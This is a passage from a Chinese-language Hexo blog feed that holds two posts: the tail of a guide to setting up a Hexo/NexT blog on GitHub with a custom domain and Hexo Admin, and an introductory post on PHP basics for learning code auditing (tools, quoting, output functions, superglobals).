class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page about</span><br></pre></td></tr></table></figure><p>命令执行后，hexo\source\about目录中生成index.md文件</p><p><strong>修改index.md文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">title: about</span><br><span class="line">date: 2016-11-15 19:08:50</span><br><span class="line">## 关于我</span><br><span class="line"></span><br><span class="line">一只学习的小菜鸟，欢迎分享知识。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">QQ：</span><br><span class="line">Email:</span><br></pre></td></tr></table></figure><h4 id="设置站内搜索"><a href="#设置站内搜索" class="headerlink" title="设置站内搜索"></a>设置站内搜索</h4><p>进入hexo根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure><p>站点配置文件中添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br></pre></td></tr></table></figure><h3 id="0x09-其他设置"><a href="#0x09-其他设置" class="headerlink" title="0x09 其他设置"></a>0x09 其他设置</h3><h4 id="hexo-首页文章只显示一部分"><a href="#hexo-首页文章只显示一部分" class="headerlink" title="hexo 首页文章只显示一部分"></a>hexo 首页文章只显示一部分</h4><p>在博客文章适当位置添加<code>&lt;!--more--&gt;</code> 标记即可</p><h4 id="网站底部字数统计"><a href="#网站底部字数统计" class="headerlink" title="网站底部字数统计"></a>网站底部字数统计</h4><p>进入hexo根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-wordcount --save</span><br></pre></td></tr></table></figure><p>hexo\themes\next\/layout_partials\footer.swig文件中末尾添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;theme-info&quot;&gt;</span><br><span class="line">  &lt;div class=&quot;powered-by&quot;&gt;&lt;/div&gt;</span><br><span class="line">  &lt;span class=&quot;post-count&quot;&gt;博客全站共&#123;&#123; totalcount(site) &#125;&#125;字&lt;/span&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><h4 id="修改文章底部的带-号的标签"><a href="#修改文章底部的带-号的标签" class="headerlink" title="修改文章底部的带#号的标签"></a>修改文章底部的带#号的标签</h4><p>修改hexo\themes\next\layout_macro\post.swig文件，搜索<code>rel=&quot;tag&quot;&gt;#</code> ，改为<code>&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt;</code></p><h4 id="在每篇文章末尾统一添加“本文结束”标记"><a href="#在每篇文章末尾统一添加“本文结束”标记" class="headerlink" title="在每篇文章末尾统一添加“本文结束”标记"></a>在每篇文章末尾统一添加“本文结束”标记</h4><p>在hexo\themes\next\layout_macro目录下，新建<code>passage-end-tag.swig</code> ，并添加如下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------本文结束&lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt;感谢您的阅读-------------&lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>接着打开hexo\themes\next\layout_macro\post.swig<code>文件，在</code>post-body 之后添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  &#123;% if not is_index %&#125;</span><br><span class="line">    &#123;% include &apos;passage-end-tag.swig&apos; %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p><img src="\\images\pasted-9.png\" alt="upload successful"></p><p>打开主题配置文件，在末尾添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 文章末尾添加“本文结束”标记</span><br><span class="line">passage_end_tag:</span><br><span class="line">  enabled: true</span><br></pre></td></tr></table></figure><h3 id="0x010-访问线上博客"><a href="#0x010-访问线上博客" class="headerlink" title="0x010 访问线上博客"></a>0x010 访问线上博客</h3><h4 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h4><p>hexo clean<br>hexo g<br>hexo d<br>浏览器访问<a href="https://yourname.github.io" target="_blank" rel="noopener">https://yourname.github.io</a> （yourname是你的github用户名）</p><p>设置域名解析<br>ping一下你的博客域名，获取其IP地址</p><p><img src="\\images\pasted-12.png\" alt="upload successful"></p><p>在阿里云或腾讯云设置域名解析</p><p><img src="/images/pasted-10.png" alt="upload successful"></p><p><img src="/images/pasted-11.png" alt="upload successful"></p><p>在Hexo目录下的source中建一个CNAME命名的文件夹(切记没有后缀)</p><p>右键新建txt文本-&gt;输入你购买的域名<a href="http://www.ainusers.top-&gt;保存关闭" target="_blank" rel="noopener">www.ainusers.top-&gt;保存关闭</a></p><p>然后快捷键F2或者右键该文本重命名-&gt;将.txt后缀去掉-&gt;会提示文件不可用继续确定即可<br><img src="/images/pasted-13.png" alt="upload successful"></p><h4 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h4><p><strong>进入hexo目录</strong></p><p>hexo clean<br>hexo g<br>hexo d<br>即可使用自定义域名访问博客，并且原博客域名也不会失效</p><h3 id="Hexo-Admin后台管理博客工具"><a href="#Hexo-Admin后台管理博客工具" class="headerlink" title="Hexo Admin后台管理博客工具"></a>Hexo Admin后台管理博客工具</h3><p>使用hexo+github确实非常方便管理自己的知识，但是缺点在于每次在本地使用markdown工具写完笔记，都要进行生成静态页面，然后本地预览或者上传github操作，操作非常繁琐。所以在这里配置使用Hexo Admin工具对博客进行管理，简化操作。</p><h4 id="Hexo-Admin介绍"><a href="#Hexo-Admin介绍" class="headerlink" title="Hexo Admin介绍"></a>Hexo Admin介绍</h4><p>官方网站：<a href="https://jaredforsyth.com/hexo-admin/" target="_blank" rel="noopener">https://jaredforsyth.com/hexo-admin/</a><br>属于hexo插件系列，使用B/S架构对博客进行后台管理</p><p><strong>安装</strong><br>进入/hexo目录git bash下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-admin</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-15.png" alt="upload successful"><br>访问hexo后台管理界面git bash下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server -d</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-16.png" alt="upload successful"></p><p>访问<a href="http://localhost:4000/即可访问本地博客" target="_blank" rel="noopener">http://localhost:4000/即可访问本地博客</a></p><p>访问<a href="http://localhost:4000/admin即可进入Hexo" target="_blank" rel="noopener">http://localhost:4000/admin即可进入Hexo</a> Admin后台管理界面</p><p>配置Hexo Admin<br>Settings选项下</p><p><img src="\\images\pasted-17.png\" alt="upload successful"></p><p>点击Setup authentification here</p><p><img src="\\images\pasted-18.png\" alt="upload successful"></p><p>配置你的Hexo Admin登陆账户及密码，以及加密cookies的字符串</p><p>下方会生成配置文件字段，将此复制到站点目录下_config.yml中</p><p>重启hexo server -d，再次访问<a href="http://localhost:4000/admin则需输入账号密码登陆。" target="_blank" rel="noopener">http://localhost:4000/admin则需输入账号密码登陆。</a></p><h3 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h3><p><a href="https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html" target="_blank" rel="noopener">https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html</a><br><a href="http://theme-next.iissnan.com/getting-started.html" target="_blank" rel="noopener">http://theme-next.iissnan.com/getting-started.html</a><br><a href="http://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html" target="_blank" rel="noopener">http://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html</a><br><a href="https://www.cnblogs.com/syd192/p/6074323.html" target="_blank" rel="noopener">https://www.cnblogs.com/syd192/p/6074323.html</a><br> <a href="https://blog.csdn.net/ainuser/article/details/77609180" target="_blank" rel="noopener">https://blog.csdn.net/ainuser/article/details/77609180</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;gitHub是一个面向&lt;a href=&quot;https://baike.baidu.com/item/%E5%BC%80%E6%BA%90/20720669&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;开源&lt;/a&gt;及私有&lt;a href=&quot;https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6/12053&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;软件&lt;/a&gt;项目的托管平台，因为只支持git 作为唯一的版本库格式进行托管，故名gitHub。 Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 &lt;a href=&quot;http://daringfireball.net/projects/markdown/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Markdown&lt;/a&gt;（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 &lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="搭建博客" scheme="http://yoursite.com/categories/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
    
    
      <category term="博客" scheme="http://yoursite.com/tags/%E5%8D%9A%E5%AE%A2/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计 基础知识</title>
    <link href="http://yoursite.com/2018/08/08/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <id>http://yoursite.com/2018/08/08/PHP代码审计-基础知识/</id>
    <published>2018-08-08T03:04:19.000Z</published>
    <updated>2018-08-09T12:47:47.870Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文记录 PHP 代码审计的学习过程</p><p><a href="https://mp.csdn.net/mdeditor/81107149" target="_blank" rel="noopener">PHP 代码审计博客目录</a></p></blockquote><a id="more"></a> <h1 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1. 环境准备"></a>1. 环境准备</h1><h2 id="1-1-测试运行环境"><a href="#1-1-测试运行环境" class="headerlink" title="1.1 测试运行环境"></a>1.1 测试运行环境</h2><p>安装 wamp</p><h2 id="1-2-PHP-编写工具"><a href="#1-2-PHP-编写工具" class="headerlink" title="1.2 PHP 编写工具"></a>1.2 PHP 编写工具</h2><ol><li>EditPlu</li><li>Notepad++</li><li>Zendstudio 10 <a href="https://pan.baidu.com/s/1ZLITLQh0zsXcVlTx-wsZRA?fid=1082316314302126" target="_blank" rel="noopener">百度云下载链接</a></li></ol><h2 id="1-3-代码审计工具"><a href="#1-3-代码审计工具" class="headerlink" title="1.3 代码审计工具"></a>1.3 代码审计工具</h2><p>Seay源代码审计系统 <a href="https://pan.baidu.com/s/1skEE2Bz?fid=143632393324465" target="_blank" rel="noopener">百度云下载链接</a></p><h2 id="1-4-代码审计平台"><a href="#1-4-代码审计平台" class="headerlink" title="1.4 代码审计平台"></a>1.4 代码审计平台</h2><ol><li>DVWA <a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">GitHub 链接</a></li><li>ZVulDrill <a href="https://github.com/710leo/ZVulDrill" target="_blank" rel="noopener">GitHub 链接</a></li></ol><h1 id="2-注释"><a href="#2-注释" class="headerlink" title="2. 注释"></a>2. 注释</h1><ol><li>单行注释 =&gt;  //单行注释</li><li>多行注释 =&gt;  /*多行注释*/</li></ol><h1 id="3-单引号和双引号"><a href="#3-单引号和双引号" class="headerlink" title="3. 单引号和双引号"></a>3. 单引号和双引号</h1><ol><li><p>单引号不解析变量</p></li><li><p>双引号解析变量</p><p>aaa=’123’</p><pre><code>echo &apos;$aaa&apos; =&gt; 结果为 $aaaecho &quot;$aaa&quot; =&gt; 结果为 123</code></pre></li></ol><h1 id="4-输出函数"><a href="#4-输出函数" class="headerlink" title="4. 输出函数"></a>4. 输出函数</h1><ol><li>echo 或者 print：最简单的输出方法</li><li>print_r、var_dump(var_export)、debug_zval_dump：输出变量数据值，特别是数组和对象数据</li><li>var_dump 会额外输出数据类型</li><li>print_r：输出格式很整齐，跟var_dump 的区别是没有类型数据，并且布尔值的 false 和 NULL 输出为空</li><li>var_export：所有的数据是可以作为组织好的变量输出的，都是能够作为直接赋值使用；需要注意的一点是, var_export 对于资源型的变量会输出NULL</li><li>debug_zval_dump：输出结果跟 var_dump 类似，唯一增加的一个值是 refcount，就是记录一个变量被引用了多少次，这是 php 的copy on write (写时复制) 的机制的一个重要特点。</li></ol><h1 id="5-超全局变量"><a href="#5-超全局变量" class="headerlink" title="5. 超全局变量"></a>5. 超全局变量</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">超全局变量——超全局变量是在全部作用域中始终可用的内置变量</span><br></pre></td></tr></table></figure><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><ol><li><p>在php 中可由用户操作的全局变量列表如下:</p><p>$GLOBALS — 引用全局作用域中可用的全部变量</p><pre><code>$_SERVER — 服务器和执行环境信息$_GET — HTTP GET 变量$_POST — HTTP POST 变量$_FILES — HTTP 文件上传变量$_REQUEST — HTTP Request 变量$_SESSION — Session 变量$_ENV — 环境变量$_COOKIE — HTTP Cookies</code></pre></li><li><p>已经被弃用的超全局变量</p><p>$_HTTP_COOKIE_VARS</p><pre><code>$_HTTP_ENV_VARS$_HTTP_GET_VARS$_HTTP_POST_FILES$_HTTP_POST_VARS$_HTTP_SERVER_VARS</code></pre></li></ol><h2 id="2-超全局变量示例"><a href="#2-超全局变量示例" class="headerlink" title="2. 超全局变量示例"></a>2. 超全局变量示例</h2><ol><li><p>$GLOBALS</p><h1 id="例一："><a href="#例一：" class="headerlink" title="例一："></a>例一：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$moon=&quot;1&quot;;</span><br><span class="line">echo $GLOBALS[&apos;moon&apos;];</span><br><span class="line">?&gt;</span><br><span class="line"># 显示结果为1</span><br><span class="line"></span><br><span class="line"># 例二</span><br><span class="line">&lt;?php</span><br><span class="line">function test()&#123;</span><br><span class="line">echo $moon=&quot;2&quot;;</span><br><span class="line">echo $GLOBALS[&apos;moon&apos;];</span><br><span class="line">&#125;</span><br><span class="line">$moon=&quot;1&quot;;</span><br><span class="line">test();</span><br><span class="line">?&gt;</span><br><span class="line"># 显示结果为 21 </span><br><span class="line"># 函数内部为局部变量，不被 $GLOBALS 所识别</span><br></pre></td></tr></table></figure></li><li><p>$_SERVER</p><p>test1.php</p><pre><code>&lt;?phpprint_r($_SERVER);?&gt;</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test2.php</span><br><span class="line">&lt;?php</span><br><span class="line">$_SERVER=&apos;aaaaaa&apos;;</span><br><span class="line">print_r($_SERVER);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出结果为服务器的配置信息</p><p><img src="https://i.imgur.com/NxGTsQ1.png" alt=""></p><p>输出结果可以被覆盖</p><p><img src="https://i.imgur.com/W6GgqVz.png" alt=""></p></li><li><p>$_GET</p><p>test.php</p><pre><code>&lt;?phpprint_r($_GET);?&gt;</code></pre><p>输出结果为 URL 中的 GET 变量的数据</p><p><img src="https://i.imgur.com/30xFhlN.png" alt=""></p></li><li><p>$_POST</p><p>test.php</p><pre><code>&lt;?phpprint_r($_POST);?&gt;</code></pre><p>输出结果为 URL 中的 POET 变量的数据</p></li><li><p>$_FILES</p><ol><li>file.html<br><form action="test.php" method="post" enctype="multipart/form-data"><pre><code>&lt;lable for=&quot;file&quot;&gt;Filename:&lt;/lable&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;&lt;br /&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;</code></pre><ol><li>test.php<br>&lt;?php<br>print_r($_FILES);<br>?&gt;</li></ol></form></li></ol><p>输出结果为提交的文件的信息</p><p><img src="https://i.imgur.com/0aqkmXB.png" alt=""></p></li><li><p>$_REQUEST</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">test1.php</span><br><span class="line">&lt;?php</span><br><span class="line">print_r($_REQUEST);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">test2.php</span><br><span class="line">&lt;?php</span><br><span class="line">$_REQUEST=&apos;aaaaaa&apos;;</span><br><span class="line">print_r($_REQUEST);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">输出结果可以被覆盖</span><br><span class="line"></span><br><span class="line">![](https://i.imgur.com/W6GgqVz.png)</span><br></pre></td></tr></table></figure><ol><li><p>$_SESSION</p><p>test1.php</p><pre><code>&lt;?phpprint_r($_SESSION);?&gt;</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test2.php</span><br><span class="line">&lt;?php</span><br><span class="line">$_SESSION=&apos;aaaaaa&apos;;</span><br><span class="line">print_r($_SESSION);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出结果可以被覆盖</p><p><img src="https://i.imgur.com/W6GgqVz.png" alt=""></p></li><li><p>$_ENV</p><p>test1.php</p><pre><code>&lt;?phpprint_r($_ENV);?&gt;</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">test2.php</span><br><span class="line">&lt;?php</span><br><span class="line">$_ENV=&apos;aaaaaa&apos;;</span><br><span class="line">print_r($_ENV);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">test3.php</span><br><span class="line">&lt;?php</span><br><span class="line">print_r($_ENV[&apos;OS&apos;]=&apos;bbbbbb&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出结果可以被覆盖</p><p><img src="https://i.imgur.com/W6GgqVz.png" alt=""></p><p><img src="https://i.imgur.com/XROLZ85.png" alt=""></p></li><li><p>$_COOKIE </p><p>test.php</p><pre><code>&lt;?phpprint_r($_COOKIE);?&gt;</code></pre><p>输出结果为 cookie 值</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文记录 PHP 代码审计的学习过程&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.csdn.net/mdeditor/81107149&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;PHP 代码审计博客目录&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="编程" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
  </entry>
  
</feed>
